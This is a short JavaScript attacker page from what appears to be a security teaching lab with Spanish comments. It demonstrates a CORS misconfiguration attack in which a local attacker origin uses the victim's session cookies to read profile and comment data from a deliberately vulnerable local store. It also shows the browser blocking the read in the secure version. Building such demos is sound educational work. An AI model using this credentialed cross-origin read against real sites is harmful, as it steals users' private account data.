// Ataque CORS (M4). El sitio atacante (127.0.0.1:4000) intenta LEER datos de la
// tienda (otro origen) usando la sesion de la victima (credentials: include).
//
// - En la version VULNERABLE la tienda refleja cualquier origen y permite
//   credenciales, asi que este fetch LEE el perfil y los comentarios de la victima.
// - En la version SEGURA el navegador bloquea la respuesta (CORS no la autoriza)
//   y el catch muestra el error.
//
// Requisito de la demo: la victima debe tener sesion abierta en la tienda, y el
// modulo M4 (CORS + SameSite=None) debe estar activo.

const TIENDA = "http://localhost:3000"; // objetivo: la tienda vulnerable

async function robar() {
    const salida = document.getElementById("resultado");
    salida.textContent = "Robando datos de " + TIENDA + " …";
    try {
        const perfil = await fetch(TIENDA + "/api/profile", { credentials: "include" });
        const comentarios = await fetch(TIENDA + "/api/comments", { credentials: "include" });

        const datos = {
            perfil: perfil.ok ? await perfil.json() : "sin sesion (" + perfil.status + ")",
            comentarios: comentarios.ok ? await comentarios.json() : comentarios.status,
        };
        salida.textContent =
            "Datos robados por el atacante:\n" + JSON.stringify(datos, null, 2);
    } catch (e) {
        salida.textContent =
            "El navegador bloqueó la lectura (CORS): " + e.message +
            "\n\nAsí responde la versión segura.";
    }
}

document.getElementById("btn-robar").addEventListener("click", robar);
